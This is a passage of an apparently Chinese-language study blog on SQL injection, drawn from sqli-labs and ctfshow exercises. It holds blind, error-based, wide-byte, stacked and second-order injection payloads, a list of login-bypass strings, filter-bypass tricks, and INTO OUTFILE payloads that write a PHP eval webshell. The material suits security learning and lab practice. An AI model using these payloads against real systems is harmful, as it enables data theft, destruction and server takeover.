+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">判断所有表名长度
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆列</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">判断所有字段名的长度
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99,sleep(5),1)--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+
+</span></span><span class="line"><span class="cl">判断字段内容长度
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">?id=1&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>脚本（修改payload和url）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span><span class="c1">#头文件</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://192.168.183.1:55251//?student_name=&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">res</span><span class="o">=</span><span class="s2">&#34;&#34;</span> <span class="c1">#结果</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span> <span class="c1">#循环</span>
+</span></span><span class="line"><span class="cl">        <span class="n">left</span><span class="o">=</span><span class="mi">32</span>
+</span></span><span class="line"><span class="cl">        <span class="n">right</span><span class="o">=</span><span class="mi">128</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="p">)</span> <span class="o">//</span><span class="mi">2</span>  <span class="c1">#二分中值</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">left</span> <span class="o">&lt;</span> <span class="n">right</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#payload = url+quote(&#34;1&#39;||if(ord(mid(database(),%d,1))&lt;%                 </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="报错注入">报错注入
+</h3><p>报错注入常用函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">floor</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">extractvalue</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">updatexml</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">geometrycollection</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">multipoint</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">polygon</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">multipolygon</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">linestring</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>updatexml()</p>
+<p>MySQL提供了一个<code>updatexml()</code>函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。</p>
+<p>我们尝试在查询用户id的同时，使用报错函数，在地址栏输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and updatexml(1, 0x7e, 3) -- a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参数2内容中的查询结果显示在数据库的报错信息中，并回显到页面。</p>
+<p><img src="/p/sql%E6%B3%A8%E5%85%A5/image-20251005132322838.png"
+	width="1540"
+	height="779"
+	srcset="/p/sql%E6%B3%A8%E5%85%A5/image-20251005132322838_hu4114161859783831431.png 480w, /p/sql%E6%B3%A8%E5%85%A5/image-20251005132322838_hu8837940689744199378.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251005132322838"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="197"
+		data-flex-basis="474px"
+	
+></p>
+<p>使用前需要判断报错和报错条件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//获取所有数据库
+</span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(&#39;~&#39;,substr((selectgroup_concat(schema_name)from information_schema.schemata),1,31)),3) --qwq 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//获取所有表
+</span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(table_name) from information_schema.tables where table_schema =&#39;security&#39;),1,31)),3) -- qwq
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//获取所有字段
+</span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(column_name) from information_schema.columns where table_schema =&#39;security&#39; and table_name=&#39;users&#39;),1,31)),3) -- qwq
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="宽字节注入">宽字节注入
+</h3><p>宽字节注入是由于不同编码中中英文<code>所占字符</code>的的不同所导致的，通常的来说，在GBK编码当中，一个汉字占用2个字节。除了UTF-8以外，所有的ANSI编码中文都是占用俩个字符。</p>
+<p>我们先说一下php中对于sql注入的过滤</p>
+<p><code>addslashes()</code>函数，这个函数在<code>预定义字符</code>之前添加反斜杠 \ 。 这个函数有一个特点虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。。这个函数的功能和<code>魔术引号</code>完全相同，所以当打开了魔术引号时，不应使用这个函数。可以使用<code>get_magic_quotes_gpc()</code>来检测是否已经转义。</p>
+<p><code>mysql_real_escape_string()</code>函数，这个函数用来转义sql语句中的特殊符号<code>x00</code>、<code>\n</code>、<code>\r</code>、<code>\</code>、<code>'</code>、<code>&quot;</code>、<code>x1a</code>。</p>
+<p><strong>注：</strong></p>
+<ol>
+<li><code>预定义字符</code>：单引 &lsquo;，双引 &ldquo;，反斜 \，NULL</li>
+<li><code>魔术引号</code>：当打开时，所有单引号 &lsquo;、双引号 &quot; 、反斜杠 \ 和NULL字符都会被自动加上一个反斜线来进行转义，和addslashes()函数的作用完全相同。所以，如果魔术引号打开，就不要使用addslashes()函数。一共有三个魔术引号指令：
+<ol>
+<li>magic_quotes_gpc</li>
+<li>magic_quotes_runtime</li>
+<li>magic_quotes_sybase</li>
+</ol>
+</li>
+</ol>
+<p>看不懂，但是宽字节注入貌似是用来绕过预定义函数的</p>
+<p>我们来看less32</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; union select 1,version(),database() -- qwq
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sql%E6%B3%A8%E5%85%A5/image-20251005133402626.png"
+	width="2079"
+	height="886"
+	srcset="/p/sql%E6%B3%A8%E5%85%A5/image-20251005133402626_hu15165859190171378691.png 480w, /p/sql%E6%B3%A8%E5%85%A5/image-20251005133402626_hu5518513429332621634.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251005133402626"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="563px"
+	
+></p>
+<p>发现注入时将\进行了转义，这时候就要把<code>\</code>去掉</p>
+<p>宽字节注入，这里利用的是MySQL的一个特性。MySQL在使用GBK编码的时候，会认为<code>2</code>个字符是<code>1</code>个汉字，前提是前一个字符的ASCII值大于128，才会认为是汉字。所以只要我们输入的数据<code>大于等于 %81</code>就可以使 &rsquo; 逃脱出来了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1�&#39; union select 1,2,3 -- qwq
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/sql%E6%B3%A8%E5%85%A5/image-20251005133712904.png"
+	width="1561"
+	height="810"
+	srcset="/p/sql%E6%B3%A8%E5%85%A5/image-20251005133712904_hu6191924451257705566.png 480w, /p/sql%E6%B3%A8%E5%85%A5/image-20251005133712904_hu17649817818398677638.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251005133712904"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="192"
+		data-flex-basis="462px"
+	
+></p>
+<h3 id="堆叠注入">堆叠注入
+</h3><p>在SQL中，分号;是用来表示一条sql语句的结束。试想一下我们在 一条语句结束后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了<code>堆叠注入</code>。而union injection（union注入）也是将两条语句合并在一起，两者之间有什么区别呢？区别就在于union 或者union all执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：root&rsquo;;DROP database user；服务器端生成的sql语句为：<code>select * from user where name='root';DROP database user；</code>当执行查询后，第一条显示查询信息，第二条则将整个user数据库删除。</p>
+<h3 id="二次注入">二次注入
+</h3><p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。二次注入是sql注入的一种，但是比普通<code>sql注入</code>利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
+<p>在第一次进行数据插入数据库得时候，仅仅知识使用了<code>addslashes()</code>或者是借助<code>get_magic_quotes_gpc()</code>对其中得字符进行了转义，在后端代码中可能会被转义，但在存入数据库时候还是原来得数据，数据中一般带有单引号和#号，然后下次使用在拼凑SQL中，所以就行了二次注入。</p>
+<p>过程</p>
+<ol>
+<li>插入1‘#</li>
+<li>转义成1\’#</li>
+<li>不能注入，但是保存在数据库时变成了原来的1’#</li>
+<li>利用1’#进行注入,这里利用时要求取出数据时不转义</li>
+</ol>
+<p>条件</p>
+<ol>
+<li>用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</li>
+<li>数据库对自己存储得数据非常放心，直接读取出恶意数据给用户</li>
+</ol>
+<h3 id="user-agent-注入">User-Agent 注入
+</h3><p>查询发现是127.0.0.1</p>
+<p><img src="/p/sql%E6%B3%A8%E5%85%A5/image-20251005183948197.png"
+	width="1240"
+	height="424"
+	srcset="/p/sql%E6%B3%A8%E5%85%A5/image-20251005183948197_hu4453644778513840463.png 480w, /p/sql%E6%B3%A8%E5%85%A5/image-20251005183948197_hu12204721986332835353.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251005183948197"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="292"
+		data-flex-basis="701px"
+	
+></p>
+<p>然后抓包在UA头里加入 <code>' and 1=2</code>监测是否存在，有报错的话就是有</p>
+<p><code>' and extractvalue(1,concat(0x7e,database(),0x7e))and '1'='1 #</code></p>
+<p>用于显示出数据库，没啥用</p>
+<h3 id="sql万能钥匙">sql万能钥匙
+</h3><p><img src="/p/sql%E6%B3%A8%E5%85%A5/429e120f5162b5a822cd10cba585135c.png"
+	width="1023"
+	height="323"
+	srcset="/p/sql%E6%B3%A8%E5%85%A5/429e120f5162b5a822cd10cba585135c_hu9977176896113618408.png 480w, /p/sql%E6%B3%A8%E5%85%A5/429e120f5162b5a822cd10cba585135c_hu926120467774075500.png 1024w"
+	loading="lazy"
+	
+		alt="429e120f5162b5a822cd10cba585135c"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="316"
+		data-flex-basis="760px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39; or 1=1#
+</span></span><span class="line"><span class="cl">&#39; or 1=&#39;1
+</span></span><span class="line"><span class="cl">&#39;or&#39;=&#39;or&#39;
+</span></span><span class="line"><span class="cl">admin
+</span></span><span class="line"><span class="cl">admin&#39;--
+</span></span><span class="line"><span class="cl">admin&#39; or 4=4--
+</span></span><span class="line"><span class="cl">admin&#39; or &#39;1&#39;=&#39;1&#39;--
+</span></span><span class="line"><span class="cl">admin888
+</span></span><span class="line"><span class="cl">&#34;or &#34;a&#34;=&#34;a
+</span></span><span class="line"><span class="cl">admin&#39; or 2=2#
+</span></span><span class="line"><span class="cl">a&#39; having 1=1#
+</span></span><span class="line"><span class="cl">a&#39; having 1=1--
+</span></span><span class="line"><span class="cl">admin&#39; or &#39;2&#39;=&#39;2
+</span></span><span class="line"><span class="cl">&#39;)or(&#39;a&#39;=&#39;a
+</span></span><span class="line"><span class="cl">or 4=4--
+</span></span><span class="line"><span class="cl">c
+</span></span><span class="line"><span class="cl">a&#39;or&#39; 4=4--
+</span></span><span class="line"><span class="cl">&#34;or 4=4--
+</span></span><span class="line"><span class="cl">&#39;or&#39;a&#39;=&#39;a
+</span></span><span class="line"><span class="cl">&#34;or&#34;=&#34;a&#39;=&#39;a
+</span></span><span class="line"><span class="cl">&#39;or&#39;&#39;=&#39;
+</span></span><span class="line"><span class="cl">&#39;or&#39;=&#39;or&#39;
+</span></span><span class="line"><span class="cl">1 or &#39;1&#39;=&#39;1&#39;=1
+</span></span><span class="line"><span class="cl">1 or &#39;1&#39;=&#39;1&#39; or 4=4
+</span></span><span class="line"><span class="cl">&#39;OR 4=4%00
+</span></span><span class="line"><span class="cl">&#34;or 4=4%00
+</span></span><span class="line"><span class="cl">&#39;xor
+</span></span><span class="line"><span class="cl">admin&#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39;
+</span></span><span class="line"><span class="cl">1
+</span></span><span class="line"><span class="cl">-1%cf&#39; union select 1,1,1 as password,1,1,1 %23
+</span></span><span class="line"><span class="cl">1
+</span></span><span class="line"><span class="cl">17..admin&#39; or &#39;a&#39;=&#39;a 密码随便
+</span></span><span class="line"><span class="cl">&#39;or&#39;=&#39;or&#39;
+</span></span><span class="line"><span class="cl">&#39;or 4=4/*
+</span></span><span class="line"><span class="cl">something
+</span></span><span class="line"><span class="cl">&#39; OR &#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl">1&#39;or&#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl">admin&#39; OR 4=4/*
+</span></span><span class="line"><span class="cl">1&#39;or&#39;1&#39;=&#39;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="三sql绕过">三、sql绕过
+</h2><h3 id="关键字绕过">关键字绕过
+</h3><p>1.用<code>/../</code>,<code>&lt;&gt;</code>分割关键字</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select -&gt; sec/**/ect || sec&lt;&gt;ect
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.根据过滤代码，可以考虑用双写绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">selselectect
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3.大小写</p>
+<p>4.url、16进制、ascii码绕过</p>
+<h3 id="逗号绕过">逗号绕过
+</h3><p>1.可以用join绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">union select 1,2,3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">union select * from (select 1)a join (select 2)b join (select 3)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.对于盲注的一些函数substr(),mid(),limit</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">substr和mid()可以使用from for的方法解决
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">substr(str from pos for len) //在str中从第pos位截取len长的字符
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mid(str from pos for len)//在str中从第pos位截取len长的字符
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">limit可以用offset的方法绕过
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">limit 1 offset 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">使用substring函数也可以绕过
+</span></span><span class="line"><span class="cl">substring(str from pos) //返回字符串str的第pos个字符，索引从1开始
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="绕过空格">绕过空格
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">（1）双空格
+</span></span><span class="line"><span class="cl">（2）/**/
+</span></span><span class="line"><span class="cl">（3）用括号绕过
+</span></span><span class="line"><span class="cl">（4）用回车代替 //ascii码为chr(13)&amp;chr(10)，url编码为%0d%0a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过滤等于号">过滤等于号
+</h3><p>用like代替</p>
+<h3 id="过滤大小等于号">过滤大小等于号
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">	（1）greatest(n1,n2,n3,...)		//返回其中的最大值
+</span></span><span class="line"><span class="cl">	（2）strcmp(str1,str2)		//当str1=str2，返回0，当str1&gt;str2，返回1，当str1&lt;str2，返回-1
+</span></span><span class="line"><span class="cl">	（3）in 操作符
+</span></span><span class="line"><span class="cl">	（4）between   and		//选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">以上是小白总结出来的几种过滤，肯定还有别的过滤，等以后遇到再更新吧！
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="四sql写马">四、sql写马
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">基于联合注入的木马</span>
+</span></span><span class="line"><span class="cl"><span class="n">UNION</span> <span class="n">ALL</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="s1">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="p">,</span><span class="mi">3</span> <span class="n">into</span> <span class="n">outfile</span> <span class="s1">&#39;/var/www/html/2.php&#39;</span><span class="o">%</span><span class="mi">23</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">不基于联合注入的木马</span>
+</span></span><span class="line"><span class="cl"><span class="n">into</span> <span class="n">outfile</span> <span class="s1">&#39;/var/www/html/2.php&#39;</span> <span class="n">FIELDS</span> <span class="n">TERMINATED</span> <span class="n">BY</span> <span class="s1">&#39;&lt;?=eval($_REQUEST[1]);?&gt;&#39;</span><span class="err">（有时候这个写入的木马没有作用，肯定和</span><span class="n">FIELDS</span> <span class="n">TERMINATED</span> <span class="n">BY有关</span><span class="err">）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">into</span> <span class="n">outfile</span> <span class="s1">&#39;/var/www/html/2.php&#39;</span> <span class="n">lines</span> <span class="n">terminated</span> <span class="n">by</span> <span class="s1">&#39;&lt;?=eval($_REQUEST[1]);?&gt;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解释一下lines terminated by，这也解释了这个写马为什么会显示一些东西，详情请看ctfshow代码审计篇web301</p>
+<p><img src="/p/sql%E6%B3%A8%E5%85%A5/image-20251123173112227.png"
+	width="1186"
+	height="415"
+	srcset="/p/sql%E6%B3%A8%E5%85%A5/image-20251123173112227_hu15827164975541268496.png 480w, /p/sql%E6%B3%A8%E5%85%A5/image-20251123173112227_hu6734338019543759108.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251123173112227"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="285"
+		data-flex-basis="685px"
+	
+></p>
+<p>关于为什么FIELDS TERMINATED BY有时候会失效（ai太好用了你们知道吗）</p>
+<p><img src="/p/sql%E6%B3%A8%E5%85%A5/image-20251123173344357.png"
+	width="1267"
+	height="358"
+	srcset="/p/sql%E6%B3%A8%E5%85%A5/image-20251123173344357_hu1521145609816122740.png 480w, /p/sql%E6%B3%A8%E5%85%A5/image-20251123173344357_hu7215051590092548643.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251123173344357"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="353"
+		data-flex-basis="849px"
+	
+></p>
+<h2 id="五sqlmap使用方式">五、sqlmap使用方式
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">常用sqlmap参数详解
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-u  url
+</span></span><span class="line"><span class="cl">-p  攻击参数
+</span></span><span class="line"><span class="cl">-r  post提交时选用 -r bp.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--dbs  指定爆数据库
+</span></span><span class="line"><span class="cl">-D 指定数据库  -D mysql
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--table  指定爆表（需要指定数据库）
+</span></span><span class="line"><span class="cl">-T  指定表  -T user
+</span></span><span class="line"><span class="cl">
